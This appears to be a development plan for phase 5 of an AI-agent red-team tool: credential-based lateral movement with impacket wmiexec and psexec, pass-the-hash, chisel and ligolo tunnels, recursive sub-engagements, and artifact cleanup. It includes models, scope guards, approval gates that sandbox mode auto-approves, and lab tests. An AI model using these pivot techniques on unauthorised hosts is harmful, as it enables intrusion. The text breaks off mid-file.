# AutoRed Phase 5 — Lateral Agent (Sub-Graph Recursion) + Cleanup Agent Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a working Lateral Agent that turns harvested credentials into pivots onto new hosts (each pivot spawning a recursive sub-engagement that runs the full Phase 4 chain against the new target), and a working Cleanup Agent that removes every artifact the engagement created (persistence artifacts, tunnels, staged temp files) and verifies the removal by re-scan. Together they close the `postex → lateral → cleanup → report` loop, making AutoRed a full internal-engagement tool.

**Architecture:** Adds `lateral_node` and `cleanup_node` to the LangGraph graph between `postex` and `report_phase1`. The Lateral Agent identifies `(credential, target_host, method)` pivot candidates from harvested secrets + trust relationships + un-footholded known hosts, sorts by confidence, gates each pivot through the EventBus HitL pattern (auto-approve in sandbox mode), executes via the PivotExecutor sub-agent (crackmapexec credential validation → impacket remote-exec channel), optionally sets up a tunnel via TunnelSetup, then spawns a sub-engagement (own engagement ID, own folder, own checkpoint DB, `parent_engagement_id` linked) running the **Phase 4 graph** — which has no lateral node, so recursion is structurally capped at depth 1. The Cleanup Agent collects every `PersistenceArtifact` (each carries the exact `removal_command` recorded at creation time), tunnels (each carries a `teardown_command`), and staged temp files, groups them into a per-host cleanup plan, gates the plan through a final HitL confirmation, executes removals via the ArtifactRemover sub-agent (remote commands transported over impacket-wmiexec / ssh), and verifies via the VerificationScanner sub-agent (re-run a per-method verify command, parse for absence).

**Tech Stack (Phase 5 additions):**
- No new Python dependencies — `impacket==0.12.0` is already in `pyproject.toml` (installed in Phase 4 for secretsdump; the same package ships `wmiexec.py` / `psexec.py` / `smbexec.py`)
- External CLI tools assumed on `$PATH` (Kali defaults, same contract as Phase 1-4): `crackmapexec`, `chisel`, `ligolo-ng`, `sshpass`
- LangGraph recursion handled by graph *composition* (sub-engagement runs the Phase 4 graph), not by recursive node edges

**Spec:** `docs/superpowers/specs/2026-09-21-autored-design.md` (Phase 5 portions: §1.2, §2.3, §5.3, §6.5, §6.6, §7.1-§7.4, §9.1, §9.2, §13.5)

---

## Global Constraints

- All Phase 1-4 code is complete and tested (227 passing, 4 skipped E2E). Phase 5 builds on top — do not modify Phase 1-4 contracts unless a task explicitly says to.
- All new tools follow the established pattern: `@tool` (outer) + `@roe_guard(allowed_categories=[...])` (inner), returning Pydantic models, with `_build_*_cmd` / `_parse_*_output` helpers unit-tested against fixtures (same shape as `secretsdump.py` / `linpeas.py`).
- The RoE Guard's `_categorize_call` mapping must be extended with all Phase 5 tools (Task 1), and `_check_roe_rules` gains the lateral `allowed_techniques` rule (Task 1).
- HitL gates use the EventBus pattern from Phases 3-4 — emit `hitl_gate` event, block on `wait_for_tui_response()`. In sandbox mode (`hitl_mode == "auto_approve"`), auto-approve. **Deviation from spec §2.3:** the spec models `lateral` as a graph-level `interrupt_before` — we keep HitL inside the node via the EventBus, exactly as Phases 3 and 4 did for `exploit` and `postex` (the established, tested pattern; graph-level interrupts would bypass the TUI).
- **E2E test target: GoAD lab, multi-host** — the standard layout puts VMs on `192.168.56.0/24`; the E2E test defaults to primary `192.168.56.22` (SRV02) and pivot target `192.168.56.11`, both overridable via env vars.
- Every `TunnelConfig` records a `teardown_command` — the Cleanup Agent runs it. (**Field added vs. spec §9.2** — the spec's `TunnelConfig` has no teardown field, but the Cleanup Agent spec §6.6 explicitly cleans up tunnels, so the field is required; documented deviation.)
- Sub-engagements run the **Phase 4 graph** (`build_phase4_graph`) — recon → vuln → exploit → postex → report. This structurally caps recursion at depth 1 (no lateral node inside a sub-engagement). A defensive `SubEngagementDepthError` guard in the spawner refuses to spawn from a state that is itself a sub-engagement (belt-and-braces, Review Focus #3).
- Sub-engagement scope narrowing: the sub-engagement's RoE is the parent's RoE with `allowed_ips` replaced by `[target_host]` — a sub-engagement can never touch anything outside its pivot target.
- `MAX_PIVOTS = 3` per lateral pass — bounds engagement duration (each pivot spawns a full sub-engagement).
- Raw tool outputs and evidence under `engagements/<id>/raw/` and `engagements/<id>/evidence/` are **never** deleted by cleanup — they are the engagement deliverable. Only staged tool binaries / staging zips (linpeas, winpeas, bloodhound, mimikatz name patterns) count as temp files.
- Code style: `ruff` with line-length=100, target Python 3.12
- Git: conventional commits (`feat:`, `test:`, `chore:`, `docs:`)

## Review Focus

Failure modes the spec implies but no single task's tests exercise — each gets a test added to the owning task:

1. **Pivot to out-of-scope target is blocked** — RoE `allowed_ips` excludes the candidate's target host → the candidate is skipped *before* the HitL gate fires (an operator must never be asked to approve something the scope forbids — same rule as Phase 4's kernel-exploit RoE check). Test in Task 11 (Lateral Agent).
2. **A failed pivot does not abort the candidate loop** — `wmiexec` returns `success=False` (bad credential) → the agent records nothing for that candidate and tries the next. Test in Task 11.
3. **Sub-engagement recursion is capped** — spawning from a state that already has `parent_engagement_id` set raises `SubEngagementDepthError` and the Lateral Agent logs + skips instead of recursing. Test in Task 10 (spawner raises) and Task 11 (agent skips).
4. **Cleanup gate rejection executes nothing** — operator rejects the cleanup plan → zero removal commands run, no `CleanupResult` entries, phase advances to `report`. Test in Task 12 (Cleanup Agent).
5. **Failed removal is recorded with an error and never marked verified** — `cleanup_execute` returns `success=False` → the `CleanupResult` carries the error and `verified=False` (a failed cleanup must be visible in the final state, never silently green). Test in Task 8 (ArtifactRemover) and Task 12.

## File Structure

Files created/modified in Phase 5:

```
autored/
├── autored/
│   ├── state.py                                # Task 1 (MODIFY: add 5 Phase 5 state fields)
│   ├── roe_guard.py                            # Task 1 (MODIFY: Phase 5 tool categories + lateral rule + proxy_ip scope)
│   ├── models/
│   │   ├── lateral.py                          # Task 1 (NEW: PivotCandidate, PivotRecord, TunnelConfig, SubEngagementRef, MovementPath)
│   │   ├── cleanup.py                          # Task 1 (NEW: CleanupResult, HostCleanupPlan, CleanupPlan)
│   │   └── __init__.py                         # Task 1 (MODIFY: export new models)
│   ├── tools/
│   │   ├── __init__.py                         # Tasks 2-5 (MODIFY: export new tools)
│   │   ├── impacket_remote.py                  # Task 2 (NEW: impacket_wmiexec, impacket_psexec, impacket_smbexec)
│   │   ├── crackmapexec.py                     # Task 3 (NEW: crackmapexec)
│   │   ├── tunnel.py                           # Task 4 (NEW: ligolo_connect, chisel_reverse)
│   │   └── cleanup.py                          # Task 5 (NEW: cleanup_execute, cleanup_verify, _build_verify_command)
│   ├── subagents/
│   │   ├── __init__.py                         # Tasks 6-9 (MODIFY: export new sub-agents)
│   │   ├── pivotexecutor.py                    # Task 6 (NEW)
│   │   ├── tunnelsetup.py                      # Task 7 (NEW)
│   │   ├── artifactremover.py                  # Task 8 (NEW)
│   │   └── verificationscanner.py              # Task 9 (NEW)
│   ├── agents/
│   │   ├── sub_engagement.py                   # Task 10 (NEW: spawn_sub_engagement + SubEngagementDepthError)
│   │   ├── lateral.py                          # Task 11 (NEW: lateral_node)
│   │   └── cleanup.py                          # Task 12 (NEW: cleanup_node)
│   └── graph.py                                # Task 13 (MODIFY: build_phase5_graph)
│   └── cli.py                                  # Task 13 (MODIFY: switch to Phase 5 graph)
├── tests/
│   ├── unit/
│   │   ├── models/
│   │   │   ├── test_lateral.py                 # Task 1
│   │   │   ├── test_cleanup_models.py          # Task 1
│   │   │   └── test_state.py                   # Task 1 (MODIFY: Phase 5 fields)
│   │   ├── roe_guard/
│   │   │   └── test_roe_guard.py               # Task 1 (MODIFY: lateral rule + Phase 5 categorization)
│   │   ├── tools/
│   │   │   ├── test_impacket_remote.py         # Task 2
│   │   │   ├── test_crackmapexec.py            # Task 3
│   │   │   ├── test_tunnel.py                  # Task 4
│   │   │   └── test_cleanup_tools.py           # Task 5
│   │   └── subagents/
│   │       ├── test_pivotexecutor.py           # Task 6
│   │       ├── test_tunnelsetup.py             # Task 7
│   │       ├── test_artifactremover.py         # Task 8
│   │       └── test_verificationscanner.py     # Task 9
│   ├── integration/
│   │   ├── test_sub_engagement.py              # Task 10
│   │   ├── test_lateral_agent.py               # Task 11
│   │   ├── test_cleanup_agent.py               # Task 12
│   │   └── test_phase5_pipeline.py             # Task 14
│   ├── e2e/
│   │   └── test_phase5_goad_multihost.py       # Task 15
│   └── fixtures/
│       ├── crackmapexec_goad.txt               # Task 3
│       ├── impacket_wmiexec_output.txt         # Task 2
│       └── impacket_wmiexec_failure.txt        # Task 2
└── docs/superpowers/plans/
    └── 2026-09-22-autored-phase5-lateral-cleanup.md   # this file
```

---

## Task 1: Extend Models (Lateral + Cleanup State, RoE Guard Categories)

**Files:**
- Create: `autored/models/lateral.py`, `autored/models/cleanup.py`
- Modify: `autored/state.py`, `autored/models/__init__.py`, `autored/roe_guard.py`
- Test: `tests/unit/models/test_lateral.py` (NEW), `tests/unit/models/test_cleanup_models.py` (NEW), `tests/unit/models/test_state.py` (MODIFY — append), `tests/unit/roe_guard/test_roe_guard.py` (MODIFY — append)

**Interfaces:**
- Consumes: `Secret` / `Trust` / `PersistenceArtifact` from `autored.models.postex` (Phase 4, unchanged); `RulesOfEngagement` from `autored.models.roe`.
- Produces:
  - `PivotCandidate(credential_id: str, username: str, cred_type: Literal, secret_value: str, source_host: str, target_host: str, method: Literal, confidence: float)` — used by Task 11's `_identify_pivot_candidates`.
  - `PivotRecord(id: str, target_host: str, method: Literal, credentials_used: list[str], success: bool, new_foothold_id: str | None, timestamp: datetime, needs_tunnel: bool)` — spec §9.2 verbatim.
  - `TunnelConfig(id: str, tool: Literal, proxy_endpoint: str, local_port: int, target_network: str, established_at: datetime, teardown_command: str)` — spec §9.2 **plus** `teardown_command` (documented deviation).
  - `SubEngagementRef(sub_id: str, target_host: str, pivot_method: str, status: Literal["running","completed","failed"], summary: str, sub_state_path: str)` — spec §9.2 verbatim.
  - `MovementPath(from_host: str, to_host: str, method: str, credential_used: str, timestamp: datetime)` — spec §9.2 verbatim.
  - `CleanupResult(artifact_id: str, host_ip: str, removal_command: str, success: bool, verified: bool, error: str | None, timestamp: datetime)` — spec §9.2 verbatim.
  - `HostCleanupPlan(host_ip: str, artifact_ids: list[str], removal_commands: list[str], tunnel_teardowns: list[str], temp_files: list[str], username: str, password: str, nthash: str)` and `CleanupPlan(by_host: list[HostCleanupPlan], total_actions: int)` — internal contract between Task 12's `_generate_cleanup_plan` and Tasks 8/9's sub-agents.
  - New `EngagementState` fields (default empty lists, so all Phase 1-4 tests keep passing): `pivots`, `tunnels`, `sub_engagements`, `movement_paths`, `cleanup_results`.
  - RoE guard: Phase 5 `_categorize_call` entries; lateral `allowed_techniques` rule; `proxy_ip` included in the generic IP-scope check.

- [ ] **Step 1: Write the failing tests (models)**

```python
# tests/unit/models/test_lateral.py
"""Unit tests for Phase 5 lateral-movement models (spec §9.2)."""
from datetime import datetime

import pytest
from pydantic import ValidationError

from autored.models.lateral import (
    MovementPath,
    PivotCandidate,
    PivotRecord,
    SubEngagementRef,
    TunnelConfig,
)


def test_pivot_candidate_fields():
    c = PivotCandidate(
        credential_id="s-1",
        username="administrator",
        cred_type="hash",
        secret_value="31d6cfe0d16ae931b73c59d7e0c089c0",
        source_host="192.168.56.22",
        target_host="192.168.56.11",
        method="wmiexec",
        confidence=0.8,
    )
    assert c.method == "wmiexec"
    assert c.cred_type == "hash"
    assert c.confidence == 0.8


def test_pivot_candidate_rejects_unknown_method():
    with pytest.raises(ValidationError):
        PivotCandidate(
            credential_id="s-1", username="u", cred_type="password",
            secret_value="p", source_host="10.0.0.1", target_host="10.0.0.2",
            method="rpd", confidence=0.5,
        )


def test_pivot_record_defaults():
    r = PivotRecord(target_host="10.0.0.2", method="psexec", credentials_used=["s-1"])
    assert r.id  # uuid default factory
    assert r.success is False
    assert r.new_foothold_id is None
    assert isinstance(r.timestamp, datetime)
    assert r.needs_tunnel is False


def test_tunnel_config_has_teardown_command():
    """Spec §9.2 TunnelConfig + the Phase-5 teardown_command addition.

    The Cleanup Agent (spec §6.6) removes tunnels — without a recorded
    teardown command there is nothing to run, so the field is mandatory.
    """
    t = TunnelConfig(
        tool="chisel",
        proxy_endpoint="10.10.14.5:1080",
        local_port=1080,
        target_network="192.168.56.0/24",
        teardown_command="pkill -f 'chisel client 10.10.14.5:1080'",
    )
    assert t.teardown_command.startswith("pkill")
    assert t.tool == "chisel"
    assert isinstance(t.established_at, datetime)


def test_tunnel_config_rejects_unknown_tool():
    with pytest.raises(ValidationError):
        TunnelConfig(
            tool="openvpn", proxy_endpoint="x:1", local_port=1,
            target_network="10.0.0.0/8", teardown_command="",
        )


def test_sub_engagement_ref_status_literal():
    ref = SubEngagementRef(
        sub_id="eng_sub_01", target_host="10.0.0.2", pivot_method="wmiexec",
        status="completed", summary="pwned", sub_state_path="engagements/eng_sub_01/state.json",
    )
    assert ref.status == "completed"
    with pytest.raises(ValidationError):
        SubEngagementRef(
            sub_id="x", target_host="t", pivot_method="m", status="paused",
            summary="", sub_state_path="",
        )


def test_movement_path_fields():
    m = MovementPath(
        from_host="10.0.0.1", to_host="10.0.0.2",
        method="wmiexec", credential_used="s-1",
    )
    assert isinstance(m.timestamp, datetime)
```

```python
# tests/unit/models/test_cleanup_models.py
"""Unit tests for Phase 5 cleanup models (spec §9.2 + plan additions)."""
from datetime import datetime

import pytest
from pydantic import ValidationError

from autored.models.cleanup import CleanupPlan, CleanupResult, HostCleanupPlan


def test_cleanup_result_fields():
    r = CleanupResult(
        artifact_id="a-1", host_ip="10.0.0.1",
        removal_command="schtasks /delete /tn AutoRedUpdate /f",
        success=True, verified=True,
    )
    assert r.error is None
    assert isinstance(r.timestamp, datetime)


def test_host_cleanup_plan_defaults():
    p = HostCleanupPlan(host_ip="10.0.0.1", artifact_ids=["a-1"])
    assert p.removal_commands == []
    assert p.tunnel_teardowns == []
    assert p.temp_files == []
    assert p.username == ""


def test_cleanup_plan_groups_by_host():
    plan = CleanupPlan(
        by_host=[
            HostCleanupPlan(host_ip="10.0.0.1", artifact_ids=["a-1"], removal_commands=["cmd1"]),
            HostCleanupPlan(host_ip="10.0.0.2", artifact_ids=["a-2"], removal_commands=["cmd2"]),
        ],
        total_actions=2,
    )
    assert {h.host_ip for h in plan.by_host} == {"10.0.0.1", "10.0.0.2"}
    assert plan.total_actions == 2
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/models/test_lateral.py tests/unit/models/test_cleanup_models.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.models.lateral'`

- [ ] **Step 3: Write the model files**

```python
# autored/models/lateral.py
"""Phase 5 lateral-movement models (spec §9.2).

``PivotCandidate`` is the plan-side triple the Lateral Agent proposes
(credential + target + method); ``PivotRecord`` is the executed outcome;
``TunnelConfig`` records a pivot tunnel **including its teardown
command** (Phase 5 addition over spec §9.2 — the Cleanup Agent needs
it); ``SubEngagementRef`` is the parent-side link to a recursively
spawned sub-engagement; ``MovementPath`` feeds the Phase 6 attack graph.
"""
from datetime import datetime
from typing import Literal
from uuid import uuid4

from pydantic import BaseModel, Field


class PivotCandidate(BaseModel):
    """A (credential, target_host, method) triple proposed for pivoting."""

    credential_id: str          # Secret.id of the harvested credential
    username: str               # parsed from Secret.source
    cred_type: Literal["password", "hash", "key", "token", "config", "other"]
    secret_value: str
    source_host: str            # Secret.host_ip — where the cred came from
    target_host: str
    method: Literal[
        "wmiexec", "psexec", "smbexec", "ssh", "winrm", "certipy", "crackmapexec",
    ]
    confidence: float


class PivotRecord(BaseModel):
    """An executed pivot (spec §9.2 PivotRecord)."""

    id: str = Field(default_factory=lambda: str(uuid4()))
    target_host: str
    method: Literal[
        "wmiexec", "psexec", "smbexec", "ssh", "winrm", "certipy", "crackmapexec",
    ]
    credentials_used: list[str] = Field(default_factory=list)  # credential IDs
    success: bool = False
    new_foothold_id: str | None = None
    timestamp: datetime = Field(default_factory=datetime.utcnow)
    needs_tunnel: bool = False


class TunnelConfig(BaseModel):
    """A pivot tunnel (spec §9.2 TunnelConfig + teardown_command).

    ``teardown_command`` is a Phase 5 addition: the Cleanup Agent (spec
    §6.6) tears tunnels down, and without a recorded command there is
    nothing deterministic to run.
    """

    id: str = Field(default_factory=lambda: str(uuid4()))
    tool: Literal["chisel", "ligolo", "proxychains", "sshuttle"]
    proxy_endpoint: str
    local_port: int
    target_network: str           # CIDR reachable through tunnel
    established_at: datetime = Field(default_factory=datetime.utcnow)
    teardown_command: str = ""


class SubEngagementRef(BaseModel):
    """Parent-side reference to a recursively spawned sub-engagement."""

    sub_id: str
    target_host: str
    pivot_method: str
    status: Literal["running", "completed", "failed"]
    summary: str
    sub_state_path: str


class MovementPath(BaseModel):
    """An executed from→to movement edge (Phase 6 attack graph input)."""

    from_host: str
    to_host: str
    method: str
    credential_used: str          # credential ID
    timestamp: datetime = Field(default_factory=datetime.utcnow)
```

```python
# autored/models/cleanup.py
"""Phase 5 cleanup models (spec §9.2 CleanupResult + plan structures)."""
from datetime import datetime
from typing import Literal

from pydantic import BaseModel, Field


class CleanupResult(BaseModel):
    """Outcome of one removal action (spec §9.2 verbatim).

    ``success`` = the removal command executed without error;
    ``verified`` = the re-scan confirmed the artifact is gone.
    A failed removal must always surface here — never silently green
    (Review Focus #5).
    """

    artifact_id: str
    host_ip: str
    removal_command: str
    success: bool
    verified: bool
    error: str | None = None
    timestamp: datetime = Field(default_factory=datetime.utcnow)


class HostCleanupPlan(BaseModel):
    """Per-host slice of the cleanup plan (internal to Cleanup Agent).

    Credentials (``username`` / ``password`` / ``nthash``) are the ones
    harvested during the engagement for this host — the removal
    commands are transported to the host via impacket-wmiexec (Windows)
    or ssh (Linux), which need working credentials.
    """

    host_ip: str
    artifact_ids: list[str] = Field(default_factory=list)
    removal_commands: list[str] = Field(default_factory=list)
    tunnel_teardowns: list[str] = Field(default_factory=list)
    temp_files: list[str] = Field(default_factory=list)
    transport: Literal["impacket_wmiexec", "ssh"] = "impacket_wmiexec"
    username: str = ""
    password: str = ""
    nthash: str = ""


class CleanupPlan(BaseModel):
    """Whole-engagement cleanup plan, grouped per host."""

    by_host: list[HostCleanupPlan] = Field(default_factory=list)
    total_actions: int = 0
```

- [ ] **Step 4: Extend `autored/models/__init__.py`**

Append to the imports (after the `postex` import block):

```python
from autored.models.lateral import (
    PivotCandidate,
    PivotRecord,
    TunnelConfig,
    SubEngagementRef,
    MovementPath,
)
from autored.models.cleanup import (
    CleanupResult,
    HostCleanupPlan,
    CleanupPlan,
)
```

And extend `__all__` with:

```python
    # Lateral movement (Phase 5)
    "PivotCandidate",
    "PivotRecord",
    "TunnelConfig",
    "SubEngagementRef",
    "MovementPath",
    # Cleanup (Phase 5)
    "CleanupResult",
    "HostCleanupPlan",
    "CleanupPlan",
```

- [ ] **Step 5: Extend `autored/state.py`**

Add to the import block from `autored.models`:

```python
from autored.models import (
    # ... existing Phase 1-4 imports unchanged ...
    PivotRecord,
    TunnelConfig,
    SubEngagementRef,
    MovementPath,
    CleanupResult,
)
```

Add the Phase 5 fields after the Post-Ex block (before `evidence_paths`):

```python
    # Lateral movement (Phase 5+)
    pivots: list[PivotRecord] = Field(default_factory=list)
    tunnels: list[TunnelConfig] = Field(default_factory=list)
    sub_engagements: list[SubEngagementRef] = Field(default_factory=list)
    movement_paths: list[MovementPath] = Field(default_factory=list)

    # Cleanup (Phase 5+)
    cleanup_results: list[CleanupResult] = Field(default_factory=list)
```

- [ ] **Step 6: Write the failing state + RoE tests (append to existing files)**

Append to `tests/unit/models/test_state.py`:

```python
class TestPhase5StateFields:
    """Phase 5 lateral/cleanup state fields default to empty (Task 1)."""

    def _state(self) -> EngagementState:
        return EngagementState(
            target_scope=["10.10.10.5"],
            operator="op",
            rules_of_engagement=RulesOfEngagement(
                engagement_name="t", operator="op", operator_signature="s",
                allowed_ips=["0.0.0.0/0"], allowed_techniques=["*"],
                persistence_allowed=True, evasion_allowed=True,
                exfiltration_allowed=True, kernel_exploits_allowed=True,
            ),
        )

    def test_phase5_fields_default_empty(self):
        s = self._state()
        assert s.pivots == []
        assert s.tunnels == []
        assert s.sub_engagements == []
        assert s.movement_paths == []
        assert s.cleanup_results == []

    def test_phase_literal_includes_lateral_and_cleanup(self):
        s = self._state()
        s.phase = "lateral"
        assert s.phase == "lateral"
        s.phase = "cleanup"
        assert s.phase == "cleanup"

    def test_state_serializes_phase5_fields(self):
        from autored.models.lateral import PivotRecord
        s = self._state()
        s.pivots.append(PivotRecord(target_host="10.0.0.2", method="wmiexec"))
        dumped = s.model_dump()
        assert dumped["pivots"][0]["target_host"] == "10.0.0.2"
        roundtrip = EngagementState.model_validate(dumped)
        assert roundtrip.pivots[0].method == "wmiexec"
```

Append to `tests/unit/roe_guard/test_roe_guard.py`:

```python
class TestPhase5RoERules:
    """Phase 5 lateral/tunnel/cleanup RoE rules (Task 1)."""

    def _roe(self, allowed_techniques=None, allowed_ips=None) -> RulesOfEngagement:
        return RulesOfEngagement(
            engagement_name="t", operator="op", operator_signature="s",
            allowed_ips=allowed_ips or ["0.0.0.0/0"],
            allowed_techniques=allowed_techniques if allowed_techniques is not None else ["*"],
            persistence_allowed=True, evasion_allowed=True,
            exfiltration_allowed=True, kernel_exploits_allowed=True,
        )

    def test_lateral_blocked_when_techniques_pinned_without_lateral(self):
        roe = self._roe(allowed_techniques=["recon", "exploit"])
        result = _check_roe_rules(roe, "lateral", {"target": "10.0.0.2"})
        assert result.allowed is False
        assert "allowed_techniques" in result.reason

    def test_lateral_allowed_with_wildcard(self):
        roe = self._roe(allowed_techniques=["*"])
        result = _check_roe_rules(roe, "lateral", {"target": "10.0.0.2"})
        assert result.allowed is True

    def test_lateral_allowed_when_explicitly_listed(self):
        roe = self._roe(allowed_techniques=["lateral", "exploit"])
        result = _check_roe_rules(roe, "lateral", {"target": "10.0.0.2"})
        assert result.allowed is True

    def test_tunnel_and_cleanup_categories_allowed_by_default(self):
        roe = self._roe()
        assert _check_roe_rules(roe, "tunnel", {"target": "10.0.0.2"}).allowed is True
        # cleanup only ever removes artifacts AutoRed itself created
        assert _check_roe_rules(roe, "cleanup", {}).allowed is True

    def test_categorize_phase5_tools(self):
        assert _categorize_call("impacket_wmiexec") == "lateral"
        assert _categorize_call("impacket_psexec") == "lateral"
        assert _categorize_call("impacket_smbexec") == "lateral"
        assert _categorize_call("crackmapexec") == "lateral"
        assert _categorize_call("ligolo_connect") == "tunnel"
        assert _categorize_call("chisel_reverse") == "tunnel"
        assert _categorize_call("cleanup_execute") == "cleanup"
        assert _categorize_call("cleanup_verify") == "cleanup"

    def test_scope_check_covers_proxy_ip_kwarg(self):
        """Tunnel tools name their endpoint ``proxy_ip`` — the generic
        IP-scope check must honour it (Task 1 roe_guard change)."""
        roe = self._roe(allowed_ips=["192.168.56.0/24"])
        blocked = _check_roe_rules(roe, "tunnel", {"proxy_ip": "10.10.14.5"})
        assert blocked.allowed is False
        ok = _check_roe_rules(roe, "tunnel", {"proxy_ip": "192.168.56.1"})
        assert ok.allowed is True
```

(If the existing test file imports `_check_roe_rules` / `_categorize_call` already, reuse those imports; otherwise add `from autored.roe_guard import _check_roe_rules, _categorize_call` at the top. Check the existing import block first and match its style.)

- [ ] **Step 7: Run tests to verify they fail**

Run: `uv run pytest tests/unit/models/test_state.py tests/unit/roe_guard/test_roe_guard.py -v`
Expected: new `TestPhase5StateFields` / `TestPhase5RoERules` tests FAIL (`pivots` attribute missing; `impacket_wmiexec` categorizes as unknown → not `"lateral"`); all pre-existing tests still PASS.

- [ ] **Step 8: Modify `autored/roe_guard.py`**

8a. Extend the `TOOL_CATEGORIES` dict inside `_categorize_call` (after the Phase 4 evasion/exfil block):

```python
        # Phase 5 — lateral movement
        "impacket_wmiexec": "lateral",
        "impacket_psexec": "lateral",
        "impacket_smbexec": "lateral",
        "crackmapexec": "lateral",
        # Phase 5 — tunnels
        "ligolo_connect": "tunnel",
        "chisel_reverse": "tunnel",
        # Phase 5 — cleanup (removes AutoRed's own artifacts only)
        "cleanup_execute": "cleanup",
        "cleanup_verify": "cleanup",
```

8b. Add the lateral rule to `_check_roe_rules`, after the `privesc_kernel` check and before the IP-scope check:

```python
    if category == "lateral" and "*" not in roe.allowed_techniques and "lateral" not in roe.allowed_techniques:
        return RoECheckResult(
            allowed=False, reason="lateral movement not in allowed_techniques",
        )
```

8c. Extend the generic IP-scope check to also cover tunnel endpoints (the `target = kwargs.get("target")` line becomes):

```python
    target = kwargs.get("target") or kwargs.get("proxy_ip")
```

- [ ] **Step 9: Run all tests to verify they pass**

Run: `uv run pytest tests/unit/models/ tests/unit/roe_guard/ -v`
Expected: ALL PASS (existing + new). Then run the full suite: `uv run pytest -q` → 227 + 18 new = **245 passed, 4 skipped**.

- [ ] **Step 10: Commit**

```bash
git add autored/models/lateral.py autored/models/cleanup.py autored/models/__init__.py autored/state.py autored/roe_guard.py tests/unit/models/test_lateral.py tests/unit/models/test_cleanup_models.py tests/unit/models/test_state.py tests/unit/roe_guard/test_roe_guard.py
git commit -m "feat: add Phase 5 lateral and cleanup models with RoE guard rules"
```

---

## Task 2: impacket Remote-Exec Tools (wmiexec / psexec / smbexec)

**Files:**
- Create: `autored/tools/impacket_remote.py`
- Modify: `autored/tools/__init__.py`
- Test: `tests/unit/tools/test_impacket_remote.py`
- Fixtures: `tests/fixtures/impacket_wmiexec_output.txt`, `tests/fixtures/impacket_wmiexec_failure.txt`

**Interfaces:**
- Consumes: `run_subprocess(cmd, timeout) -> SubprocessResult` from `autored.subprocess_runner`; `_save_raw(tool, target, stdout, stderr, engagement_id) -> str` from `autored.tools.nmap`; `roe_guard` from `autored.roe_guard`.
- Produces:
  - `ImpacketRemoteResult(host_ip: str, method: Literal["wmiexec","psexec","smbexec"], command_executed: str, output: str, success: bool, raw_output_path: str, duration_sec: float)` — consumed by Task 6 (PivotExecutor).
  - `@tool impacket_wmiexec(username: str, password: str, nthash: str, target: str, command: str, engagement_id: str) -> ImpacketRemoteResult` (same signature for `impacket_psexec`, `impacket_smbexec`).
  - `_build_impacket_cmd(tool_name, username, password, nthash, target, command) -> list[str]` and `_parse_impacket_output(result, host_ip, method, command, raw_path) -> ImpacketRemoteResult` — reused by Task 5's cleanup transport.

- [ ] **Step 1: Write the fixtures**

```text
# tests/fixtures/impacket_wmiexec_output.txt
[*] SMBv3.0 dialect used
[+] Launching a semi-interactive shell...
goaad\administrator
C:\>whoami
goaad\administrator
```

```text
# tests/fixtures/impacket_wmiexec_failure.txt
[*] SMBv3.0 dialect used
[-] SMB SessionError: STATUS_LOGON_FAILURE (The attempted logon is invalid...)
```

- [ ] **Step 2: Write the failing tests**

```python
# tests/unit/tools/test_impacket_remote.py
"""Unit tests for impacket remote-exec tool wrappers (Phase 5 Task 2).

Only the pure helpers (_build_*_cmd, _parse_*_output) and the Result
model are exercised — the @roe_guard-decorated entrypoints require a
registered RoE and a live subprocess, which integration tests cover.
Same pattern as tests/unit/tools/test_secretsdump.py.
"""
from pathlib import Path

from autored.subprocess_runner import SubprocessResult
from autored.tools.impacket_remote import (
    ImpacketRemoteResult,
    _build_impacket_cmd,
    _parse_impacket_output,
)

FIXTURES = Path(__file__).parents[2] / "tests" / "fixtures"


def _sub(result_text: str, returncode: int = 0) -> SubprocessResult:
    return SubprocessResult(
        stdout=result_text, stderr="", returncode=returncode,
        duration_sec=1.0, command="wmiexec.py",
    )


def test_build_cmd_with_password():
    cmd = _build_impacket_cmd(
        "wmiexec", "administrator", "Password1!", "", "192.168.56.11", "whoami",
    )
    assert cmd[0] == "wmiexec.py"
    assert "administrator:Password1!@192.168.56.11" in cmd
    assert cmd[-1] == "whoami"
    assert "-hashes" not in cmd


def test_build_cmd_with_nthash():
    cmd = _build_impacket_cmd(
        "psexec", "administrator", "", "31d6cfe0d16ae931b73c59d7e0c089c0",
        "192.168.56.11", "whoami",
    )
    assert "-hashes" in cmd
    assert ":31d6cfe0d16ae931b73c59d7e0c089c0" in cmd
    assert "administrator@192.168.56.11" in cmd
    assert "Password1!" not in " ".join(cmd)


def test_build_smbexec_cmd_shape():
    cmd = _build_impacket_cmd(
        "smbexec", "bob", "pass", "", "10.0.0.2", "id",
    )
    assert cmd[0] == "smbexec.py"
    assert "bob:pass@10.0.0.2" in cmd


def test_parse_success_output():
    text = (FIXTURES / "impacket_wmiexec_output.txt").read_text()
    res = _parse_impacket_output(_sub(text), "192.168.56.11", "wmiexec", "whoami", "")
    assert res.success is True
    assert res.host_ip == "192.168.56.11"
    assert "administrator" in res.output


def test_parse_failure_logon_failure():
    text = (FIXTURES / "impacket_wmiexec_failure.txt").read_text()
    res = _parse_impacket_output(_sub(text), "192.168.56.11", "wmiexec", "whoami", "")
    assert res.success is False


def test_parse_failure_nonzero_returncode():
    res = _parse_impacket_output(
        _sub("whatever", returncode=1), "10.0.0.2", "wmiexec", "id", "",
    )
    assert res.success is False


def test_parse_failure_session_exception():
    res = _parse_impacket_output(
        _sub("[!] SessionError: something broke"), "10.0.0.2", "smbexec", "id", "",
    )
    assert res.success is False


def test_result_model_defaults():
    r = ImpacketRemoteResult(
        host_ip="h", method="wmiexec", command_executed="whoami", output="o",
        success=True,
    )
    assert r.raw_output_path == ""
    assert r.duration_sec == 0.0
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tools/test_impacket_remote.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.tools.impacket_remote'`

- [ ] **Step 4: Write `autored/tools/impacket_remote.py`**

```python
"""Impacket remote-execution tools (wmiexec / psexec / smbexec).

These are the Phase 5 lateral-movement workhorses: unlike the Phase 4
foothold-shell tools (linpeas/mimikatz build a command string for a
future session manager to run), impacket's remote-exec tools run **on
the AutoRed host** and talk to the target over SMB — so a pivot via
these tools is fully functional today, given credentials and network
reachability. The spec's tool table (§5.3) pins ``impacket_wmiexec``;
